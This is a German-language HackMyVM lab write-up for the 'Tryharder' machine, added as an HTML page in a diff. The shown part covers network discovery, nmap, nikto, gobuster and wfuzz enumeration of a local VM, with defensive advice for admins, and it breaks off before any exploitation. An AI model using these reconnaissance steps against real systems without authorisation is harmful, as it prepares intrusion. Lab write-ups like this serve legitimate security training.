@@ -1,1 +1,1539 @@
-﻿﻿
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tryharder - HackMyVM - Medium - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+
+    <div class="header-bg">
+        <h1>Tryharder - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2>Medium</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">Burp Suite</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">git</div>
+                <div class="tool-item">sjwt.py</div>
+                <div class="tool-item">jwt_tool.py</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">chisel</div>
+                <div class="tool-item">python (http.server)</div>
+                <div class="tool-item">ps</div>
+                <div class="tool-item">file</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">perl</div>
+                <div class="tool-item">nano</div>
+                <div class="tool-item">gcc</div>
+                <div class="tool-item">LD_PRELOAD</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#poc">Proof of Concept</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der erste Schritt ist die Identifizierung des Ziels im lokalen Netzwerk. `arp-scan -l` sendet ARP-Requests an alle Geräte im lokalen Netzwerksegment. Die Ausgabe wird dann mit `grep "PCS"` gefiltert, um Geräte zu finden, deren Herstellerbezeichnung "PCS Systemtechnik" enthält (oft ein Hinweis auf VirtualBox-VMs). `awk '{print $1}'` extrahiert schließlich nur die IP-Adresse aus der gefilterten Zeile.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Befehl ist ein effektiver Weg, um schnell VMs in einem lokalen Testnetzwerk zu finden, besonders wenn man den Hersteller der virtuellen Netzwerkkarte kennt. Die Ausgabe `192.168.2.186` ist unsere Ziel-IP.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> `arp-scan` ist ein gutes Werkzeug für die initiale Host-Discovery in LANs. Manchmal ist es hilfreich, ohne `grep` zu arbeiten, um alle Geräte zu sehen, oder spezifischer nach MAC-Adressbereichen zu filtern, falls bekannt.
+            <br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung und Überwachung von ARP-Traffic können helfen, unautorisierte Geräte oder Scans zu erkennen. Für kritische Systeme sollten statische ARP-Einträge in Betracht gezogen werden, obwohl dies den Verwaltungsaufwand erhöht.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
+                    <pre>192.168.2.186</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `vi /etc/hosts` öffnet die Hosts-Datei im Texteditor `vi`. Diese Datei wird vom Betriebssystem verwendet, um Hostnamen manuell IP-Adressen zuzuordnen, bevor DNS-Server konsultiert werden. Der Eintrag `192.168.2.186   tryharder.hmv` wird hinzugefügt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Hinzufügen eines Eintrags zur Hosts-Datei ist eine gängige Praxis während Pentests, um das Zielsystem unter einem leicht merkbaren Hostnamen anzusprechen, besonders wenn noch kein funktionierender DNS-Eintrag für das Ziel existiert oder man spezifische virtuelle Hosts auf einem Webserver testen möchte. Dies vereinfacht die weitere Interaktion mit dem Ziel.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Immer die Hosts-Datei anpassen, um die Arbeit zu erleichtern und realistische Szenarien (Zugriff über Hostnamen) zu simulieren. Sicherstellen, dass der gewählte Hostname nicht mit realen, wichtigen Diensten kollidiert.
+            <br><strong>Empfehlung (Admin):</strong> Die zentrale Verwaltung von DNS-Einträgen ist vorzuziehen. Die Überwachung von Änderungen an der lokalen Hosts-Datei auf Endgeräten kann ein Indikator für unautorisierte Aktivitäten sein, ist aber oft aufwendig.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>                192.168.2.186   tryharder.hmv</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `nmap` wird verwendet, um einen umfassenden Scan des Ziels `192.168.2.186` durchzuführen.
+            ` -sC`: Führt Default-Skripte aus (nützlich für Schwachstellen- und Informationssammlung).
+            ` -sS`: Führt einen TCP SYN-Scan durch (Stealth-Scan, oft schneller und weniger auffällig als ein voller Connect-Scan).
+            ` -sV`: Versucht, die Versionen der laufenden Dienste zu ermitteln.
+            ` -T5`: Setzt das Timing-Template auf "insane" (sehr aggressiv und schnell; kann unzuverlässig sein oder Intrusion Detection Systeme auslösen).
+            ` -A`: Aktiviert OS-Erkennung, Versionserkennung, Skript-Scanning und Traceroute.
+            ` -p-`: Scannt alle 65535 TCP-Ports.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Nmap-Scan ist ein fundamentaler Schritt in der Reconnaissance-Phase. Die Ergebnisse zeigen zwei offene Ports:
+            Port <span class="command">22/tcp</span>: Läuft <span class="command">OpenSSH 7.9p1 Debian 10+deb10u2</span>. SSH ist ein Fernwartungsprotokoll. Die Versionsinformation ist nützlich für die Suche nach bekannten Schwachstellen.
+            Port <span class="command">80/tcp</span>: Läuft <span class="command">Apache httpd 2.4.59 ((Debian))</span>. Dies ist ein Webserver. Der Titel der Webseite (`\xE8\xA5\xBF\xE6\xBA\xAA\xE6\xB9\x96\xE7\xA7\x91\xE6\x8A\x80 - \xE4\xBC\x81\xE4\xB8\x9A\xE9\x97\xA8\xE6\x88\xB7\xE7\xBD\x91\xE7\xAB\x99`) scheint chinesische Schriftzeichen zu enthalten.
+            Die MAC-Adresse und die OS-Erkennung (Linux 4.X/5.X, MikroTik RouterOS) liefern weitere Kontextinformationen. Die Service-Info bestätigt Linux als Betriebssystem.
+            Die `TRACEROUTE`-Information zeigt, dass das Ziel direkt erreichbar ist (1 Hop).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Ergebnisse des Nmap-Scans sind die Basis für die nächsten Schritte. Der Webserver auf Port 80 ist ein primäres Angriffsziel. Die SSH-Version sollte auf bekannte Exploits überprüft werden. Die Option `-T5` sollte mit Vorsicht verwendet werden; in realen Engagements ist `-T4` oft ein besserer Kompromiss zwischen Geschwindigkeit und Zuverlässigkeit/Unauffälligkeit.
+            <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass nur notwendige Ports offen sind. Halten Sie die Software (SSH, Apache) aktuell, um bekannte Schwachstellen zu vermeiden. Konfigurieren Sie Firewalls, um den Zugriff auf Dienste einzuschränken. Überwachen Sie Netzwerkscans und verdächtige Aktivitäten.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sC -sS -sV -T5 -A 192.168.2.186 -p-</span></div>
+                    <pre>Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-29 14:15 CEST
+Nmap scan report for tryharder.hmv (192.168.2.186)
+Host is up (0.00014s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+| ssh-hostkey: 
+|   2048 <span class="command">93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd</span> (RSA)
+|   256 <span class="command">1e:a7:44:0b:2c:1b:0d:77:83:df:1d:9f:0e:30:08:4d</span> (ECDSA)
+|_  256 <span class="command">d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71</span> (ED25519)
+<span class="command">80/tcp open  http    Apache httpd 2.4.59 ((Debian))</span>
+|_http-title: <span class="command">\xE8\xA5\xBF\xE6\xBA\xAA\xE6\xB9\x96\xE7\xA7\x91\xE6\x8A\x80 - \xE4\xBC\x81\xE4\xB8\x9A\xE9\x97\xA8\xE6\x88\xB7\xE7\xBD\x91\xE7\xAB\x99</span>
+|_http-server-header: <span class="command">Apache/2.4.59 (Debian)</span>
+MAC Address: <span class="command">08:00:27:BD:05:BA</span> (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Device type: <span class="command">general purpose|router</span>
+Running: <span class="command">Linux 4.X|5.X, MikroTik RouterOS 7.X</span>
+OS CPE: <span class="command">cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3</span>
+OS details: <span class="command">Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)</span>
+Network Distance: 1 hop
+Service Info: OS: <span class="command">Linux</span>; CPE: <span class="command">cpe:/o:linux:linux_kernel</span>
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.14 ms tryharder.hmv (192.168.2.186)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.57 seconds</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Dieser Befehl wiederholt den vorherigen Nmap-Scan, filtert die Ausgabe aber direkt mit `grep open`, um nur die Zeilen anzuzeigen, die offene Ports enthalten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine schnelle Methode, um die offenen Ports aus einer umfangreichen Nmap-Ausgabe zu extrahieren. Es bestätigt die bereits identifizierten offenen Ports 22 (SSH) und 80 (HTTP). Die Wiederholung des Scans selbst war hier technisch nicht notwendig, da die Informationen bereits vorlagen, aber die Filterung ist nützlich für eine schnelle Übersicht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Für eine reine Übersicht der offenen Ports nach einem Scan kann man auch Nmap-Ausgabeformate wie `-oG` (grepable) verwenden und dann mit `grep /open/` filtern. Dies vermeidet einen erneuten vollständigen Scan.
+            <br><strong>Empfehlung (Admin):</strong> Regelmäßige Überprüfung offener Ports auf Systemen ist wichtig. Automatisierte Tools können dabei helfen, Änderungen im Zeitverlauf zu erkennen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sC -sS -sV -T5 -A 192.168.2.186 -p- | grep open</span></div>
+                    <pre><span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.59 ((Debian))</span></pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> `nikto` ist ein Webserver-Scanner, der auf bekannte Schwachstellen, Fehlkonfigurationen und interessante Dateien/Verzeichnisse prüft. `-h http://192.168.2.186` gibt das Ziel an.
+            Die Ausgabe zeigt:
+            Server-Version: <span class="command">Apache/2.4.59 (Debian)</span>.
+            Fehlender `X-Frame-Options`-Header: Ermöglicht potenziell Clickjacking-Angriffe.
+            Fehlender `X-Content-Type-Options`-Header: Könnte Browser dazu verleiten, Inhalte anders als den deklarierten MIME-Typ zu interpretieren.
+            Mögliches Inode-Leak über ETags: Könnte Informationen über die interne Dateistruktur preisgeben (CVE-2003-1418, sehr alt).
+            Erlaubte HTTP-Methoden: <span class="command">GET, POST, OPTIONS, HEAD</span>.
+            Gefundene Apache-Standarddatei: `/icons/README`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto liefert einige nützliche Hinweise auf mögliche kleinere Schwachstellen und Konfigurationsmängel. Das Fehlen von Security Headern wie `X-Frame-Options` und `X-Content-Type-Options` sind häufige Funde und sollten behoben werden, stellen aber meist keine direkten Einfallstore dar. Das ETag-Inode-Leak ist alt und von geringem Risiko. Die Information über erlaubte HTTP-Methoden und die gefundene Standarddatei sind gut zu wissen, aber nicht unmittelbar kritisch.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundenen Header-Probleme sollten im Bericht erwähnt werden. Die `/icons/README`-Datei ist meist harmlos, aber alle Standarddateien sollten im Kontext der Anwendung geprüft werden. Die `OPTIONS`-Methode kann manchmal weitere Informationen liefern, z.B. über `WebDAV`-Unterstützung.
+            <br><strong>Empfehlung (Admin):</strong> Implementieren Sie wichtige Security Header wie `X-Frame-Options: DENY` oder `SAMEORIGIN`, `X-Content-Type-Options: nosniff`, `Content-Security-Policy`, etc. um die Sicherheit der Webanwendung zu erhöhen. Entfernen oder beschränken Sie den Zugriff auf nicht benötigte Standarddateien und -verzeichnisse des Webservers.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nikto -h http://192.168.2.186</span></div>
+                    <pre>- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          <span class="command">192.168.2.186</span>
++ Target Hostname:    <span class="command">192.168.2.186</span>
++ Target Port:        <span class="command">80</span>
++ Start Time:         2025-04-29 14:16:31 (GMT2)
+---------------------------------------------------------------------------
++ Server: <span class="command">Apache/2.4.59 (Debian)</span>
++ /: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> See: [Link: developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]
++ /: <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /: <span class="password">Server may leak inodes via ETags, header found with file /, inode: 1ccb, size: 6312413777e73, mtime: gzip.</span> See: [Link: cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418]
++ OPTIONS: <span class="password">Allowed HTTP Methods: GET, POST, OPTIONS, HEAD</span> .
++ /icons/README: <span class="password">Apache default file found.</span> See: [Link: www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/ | Ziel: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/]
++ <span class="command">8102 requests: 0 error(s) and 5 item(s) reported on remote host</span>
++ End Time:           2025-04-29 14:16:54 (GMT2) (23 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird für das Directory/File-Bruteforcing verwendet.
+            `dir`: Gibt den Modus für Directory/File-Enumeration an.
+            `-u "http://tryharder.hmv"`: Die Ziel-URL.
+            `-w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"`: Die Wortliste, die für die Suche verwendet wird. Die hier angegebene Wortliste ist unvollständig im Befehl (`/usr/share/wordlists....,pHtml`), aber die Ausgabe zeigt die korrekte, lange Wortliste. Der Teil `pHtml` scheint ein Tippfehler im eingegebenen Befehl zu sein, wird aber vom Tool oder der Shell ignoriert/korrigiert.
+            `-b '503,404,403'`: Statuscodes, die als "nicht gefunden" interpretiert und somit ausgeblendet werden sollen.
+            `-e`: Erweiterter Modus, sucht nach Dateien mit den angegebenen Erweiterungen.
+            `--no-error`: Unterdrückt Fehlermeldungen (z.B. Verbindungsprobleme).
+            `-k`: Überspringt die SSL-Zertifikatsverifizierung (hier nicht relevant, da HTTP).
+            Der Befehl sucht nach verschiedenen Dateierweiterungen wie `pub, dll, lib, mdb, gz, phtml, ...`.
+            Das einzige signifikante Ergebnis ist `http://tryharder.hmv/index.html` mit Status 200.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Gobuster hat die `index.html` gefunden, was erwartet wird. Es wurden keine weiteren versteckten Verzeichnisse oder Dateien mit dieser spezifischen Wortliste und den Standardeinstellungen für Erweiterungen entdeckt. Dies bedeutet nicht zwingend, dass nichts vorhanden ist, sondern nur, dass diese spezielle Konfiguration nichts weiter gefunden hat.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie es mit verschiedenen Wortlisten (größere, spezifischere für die Technologie). Testen Sie weitere Dateierweiterungen, die für die vermutete Servertechnologie relevant sein könnten (z.B. `.php`, `.bak`, `.config`). Verwenden Sie Tools, die rekursiv suchen können. Die Angabe `pHtml` im ursprünglichen Befehl sollte korrigiert werden, um Verwirrung zu vermeiden.
+            <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie Verzeichnislistings. Stellen Sie sicher, dass keine sensiblen Dateien oder Backup-Dateien öffentlich zugänglich sind. Verwenden Sie nach Möglichkeit Whitelisting für zugreifbare Pfade.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">gobuster dir -u "http://tryharder.hmv" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -b '503,404,403' -e --no-error -k</span></div>
+                    <pre>===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     <span class="command">http://tryharder.hmv</span>
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                <span class="command">/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span>
+[+] Negative Status codes:   503,404,403
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              <span class="command">pub,dll,lib,mdb,gz,phtml,...</span>
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+<span class="command">http://tryharder.hmv/index.html</span>           (Status: 200) [Size: 7371]</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `curl -Iv "http://192.168.2.186"` sendet eine HTTP HEAD-Anfrage an die IP-Adresse.
+            `-I`: Sendet eine HEAD-Anfrage (holt nur die HTTP-Header).
+            `-v`: Verbose-Modus, zeigt detaillierte Informationen über die Verbindung und die Anfrage/Antwort an.
+            Die Antwort-Header bestätigen:
+            Status: <span class="command">HTTP/1.1 200 OK</span>.
+            Server: <span class="command">Apache/2.4.59 (Debian)</span>.
+            `Last-Modified`, `ETag`, `Content-Length` und `Content-Type: text/html` sind Standard-Header.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Curl-Befehl bestätigt, dass der Webserver erreichbar ist und liefert die Header der Hauptseite. Dies wiederholt im Wesentlichen Informationen, die bereits durch Nmap und Nikto gewonnen wurden, kann aber nützlich sein, um schnell die Erreichbarkeit und grundlegende Header zu prüfen, ohne einen vollständigen Scan durchzuführen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Curl ist ein mächtiges Werkzeug für manuelle HTTP-Anfragen. Es kann verwendet werden, um spezifische Header zu senden, Authentifizierung zu testen, Cookies zu setzen und vieles mehr. In diesem Fall liefert es keine neuen kritischen Informationen, bestätigt aber die bisherigen Funde.
+            <br><strong>Empfehlung (Admin):</strong> Die Server-Header sollten regelmäßig überprüft werden. Es ist ratsam, unnötige Informationen wie detaillierte Server-Versionen (obwohl Apache hier nur "Apache/2.4.59 (Debian)" anzeigt, was gängig ist) zu minimieren, um Angreifern weniger Angriffsfläche zu bieten (Security through Obscurity, aber in Kombination mit anderen Maßnahmen sinnvoll).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -Iv "http://192.168.2.186"</span></div>
+                    <pre>*   Trying 192.168.2.186:80...
+* <span class="password">Connected to 192.168.2.186 (192.168.2.186) port 80</span>
+* using HTTP/1.x
+&gt; HEAD / HTTP/1.1
+&gt; Host: 192.168.2.186
+&gt; User-Agent: curl/8.13.0
+&gt; Accept: */*
+&gt; 
+* Request completely sent off
+&lt; <span class="password">HTTP/1.1 200 OK</span>
+HTTP/1.1 200 OK
+&lt; Date: Tue, 29 Apr 2025 12:29:11 GMT
+Date: Tue, 29 Apr 2025 12:29:11 GMT
+&lt; Server: <span class="command">Apache/2.4.59 (Debian)</span>
+Server: Apache/2.4.59 (Debian)
+&lt; Last-Modified: Tue, 25 Mar 2025 05:34:35 GMT
+Last-Modified: Tue, 25 Mar 2025 05:34:35 GMT
+&lt; ETag: "1ccb-6312413777e73"
+ETag: "1ccb-6312413777e73"
+&lt; Accept-Ranges: bytes
+Accept-Ranges: bytes
+&lt; Content-Length: 7371
+Content-Length: 7371
+&lt; Vary: Accept-Encoding
+Vary: Accept-Encoding
+&lt; Content-Type: text/html
+Content-Type: text/html
+&lt; 
+
+* Connection #0 to host 192.168.2.186 left intact</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird verwendet, um nach virtuellen Hosts (Subdomains) zu suchen.
+            `-c`: Farbige Ausgabe.
+            `-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt`: Wortliste mit potenziellen Subdomain-Namen.
+            `-u "http://tryharder.hmv"`: Basis-URL.
+            `-H "Host: FUZZ.tryharder.hmv"`: Setzt den Host-Header. `FUZZ` wird durch die Einträge aus der Wortliste ersetzt.
+            `--hc "404"`: Versteckt Antworten mit dem Statuscode 404 (Not Found).
+            `--hh 7371`: Versteckt Antworten, deren Zeichenanzahl (Chars) 7371 beträgt. Dies ist die Größe der `index.html` der Hauptseite, um False Positives durch die Standardseite zu vermeiden.
+            Die Ausgabe zeigt einige Ergebnisse mit Statuscode <span class="command">400 (Bad Request)</span> und einer Größe von 301 Chars für Payloads wie `#www`, `#mail` etc. Diese beginnen mit `#`, was auf einen Fehler bei der Interpretation dieser spezifischen Payloads durch den Webserver oder wfuzz hindeutet oder es sind ungültige Hostnamen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Warnung `Pycurl is not compiled against Openssl` ist für diesen HTTP-Scan nicht relevant, wäre es aber für HTTPS-Ziele. Die Ergebnisse mit Status 400 deuten nicht auf gültige Subdomains hin. Der Versuch, die Standardantwort basierend auf der Zeichenanzahl auszublenden (`--hh 7371`), ist eine gute Technik. Es wurden keine neuen, funktionierenden virtuellen Hosts gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie die Wortliste auf ungültige Einträge (wie die mit `#`). Testen Sie verschiedene Filteroptionen (`--hc`, `--hl`, `--hw`, `--hh`). Manchmal reagieren Server auf ungültige Host-Header mit Status 400, was hier der Fall zu sein scheint. Es ist auch wichtig, die Größe der Fehlerseite (falls vorhanden) zu ermitteln und ebenfalls auszublenden. In diesem Fall hat der Scan keine verwertbaren Subdomains ergeben.
+            <br><strong>Empfehlung (Admin):</strong> Verwenden Sie Wildcard-DNS-Einträge mit Vorsicht. Konfigurieren Sie den Webserver so, dass er für unbekannte Host-Header eine Standardseite oder einen Fehlercode liefert, der keine Informationen preisgibt. Protokollieren Sie Anfragen an unbekannte Host-Header, um Enumerationsversuche zu erkennen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://tryharder.hmv" -H "Host: FUZZ.tryharder.hmv" --hc "404" --hh 7371</span></div>
+                    <pre> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://tryharder.hmv/
+Total requests: 114442
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                      
+=====================================================================
+
+<span class="command">000009533:   400        10 L     35 W       301 Ch      "#www"</span>                       
+<span class="command">000010582:   400        10 L     35 W       301 Ch      "#mail"</span>                      
+<span class="command">000047707:   400        10 L     35 W       301 Ch      "#smtp"</span>                      
+<span class="command">000103136:   400        10 L     35 W       301 Ch      "#pop3"</span>                      
+
+Total time: 0
+Processed Requests: 114442
+Filtered Requests: 114438
+Requests/sec.: 0</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Hier wird ein Nmap-Scan auf IPv6-Adressen durchgeführt. Es werden drei verschiedene Link-Local-IPv6-Adressen (`fe80::...`) gescannt, die vermutlich zum selben Zielhost gehören oder im selben Netzwerksegment liegen.
+            Für `fe80::a00:27ff:febd:5ba` werden Port <span class="command">22 (ssh)</span> und <span class="command">80 (http)</span> als offen gemeldet. Die MAC-Adresse ist identisch mit der des IPv4-Ziels.
+            Für `fe80::d0a5:97c8:ee04:6f55` werden alle Ports als "ignored states" oder "closed" gemeldet.
+            Der Scan erwähnt "3 IP addresses (3 hosts up)".</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Es ist wichtig, auch IPv6 zu scannen, da Dienste darüber erreichbar sein könnten, die über IPv4 nicht verfügbar sind oder anders konfiguriert wurden. In diesem Fall scheinen die gleichen Dienste (SSH, HTTP) auf einer der IPv6-Adressen des Ziels zu laufen. Die anderen IPv6-Adressen zeigen keine offenen Ports. Dass drei Hosts als "up" gemeldet werden, könnte daran liegen, dass jede IPv6-Adresse als separater Host gezählt wird, auch wenn sie zum selben Interface gehören.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Immer auch IPv6-Scans durchführen, wenn IPv6 im Netzwerk aktiv ist. Verwenden Sie `nmap -6 ...` für IPv6-Scans. Untersuchen Sie die gefundenen offenen Ports auf IPv6 genauso wie auf IPv4.
+            <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Ihre Firewall-Regeln und Dienstkonfigurationen sowohl für IPv4 als auch für IPv6 konsistent und sicher sind. Deaktivieren Sie IPv6 auf Systemen, wenn es nicht benötigt wird, um die Angriffsfläche zu reduzieren.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>:::::::::::::::::::::::::::::: Nmap IPv6 Scan ::::::::::::::::::::::::::::: 
+
+ ---------------- IPv6 Adresse: fe80::a00:27ff:febd:5ba%eth0:
+fe80::ccf4:81ff:fe80:c5d4%eth0:
+fe80::d0a5:97c8:ee04:6f55%eth0:  ---------------
+ 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-29 14:33 CEST
+Nmap scan report for Tryharder (<span class="command">fe80::a00:27ff:febd:5ba</span>)
+Host is up (0.0011s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+<span class="command">22/tcp open  ssh</span>
+<span class="command">80/tcp open  http</span>
+MAC Address: <span class="command">08:00:27:BD:05:BA</span> (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap scan report for <span class="command">fe80::d0a5:97c8:ee04:6f55</span>
+Host is up (0.0000060s latency).
+All 65535 scanned ports on fe80::d0a5:97c8:ee04:6f55 are in ignored states.
+Not shown: 65535 closed tcp ports (reset)
+
+Nmap done: 3 IP addresses (3 hosts up) scanned in 28.87 seconds</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Dies ist keine Befehlsausgabe, sondern eine Notiz, die wahrscheinlich aus den Ergebnissen einer `OPTIONS`-Anfrage an den Webserver stammt (z.B. via `curl -X OPTIONS http://tryharder.hmv -v` oder wie von Nikto berichtet).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die erlaubten HTTP-Methoden sind <span class="command">GET, POST, OPTIONS, HEAD</span>. Dies ist eine Standardkonfiguration für viele Webserver, die keine unsicheren Methoden wie PUT oder DELETE für anonyme Benutzer erlauben. Diese Information wurde bereits von Nikto geliefert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wenn Methoden wie `PUT` oder `DELETE` ohne Authentifizierung erlaubt wären, könnte dies eine schwere Schwachstelle darstellen (Hochladen/Löschen von Dateien). `TRACE` (wenn aktiviert) könnte für Cross-Site Tracing (XST) missbraucht werden, ist aber selten. `CONNECT` ist für Proxys relevant.
+            <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass nur die HTTP-Methoden aktiviert sind, die von der Anwendung tatsächlich benötigt werden. Deaktivieren Sie insbesondere `PUT`, `DELETE`, `TRACE`, `CONNECT` auf dem Webserver global, wenn sie nicht spezifisch erforderlich sind.</p>
+            <div class="code-block">
+                <div class="terminal">
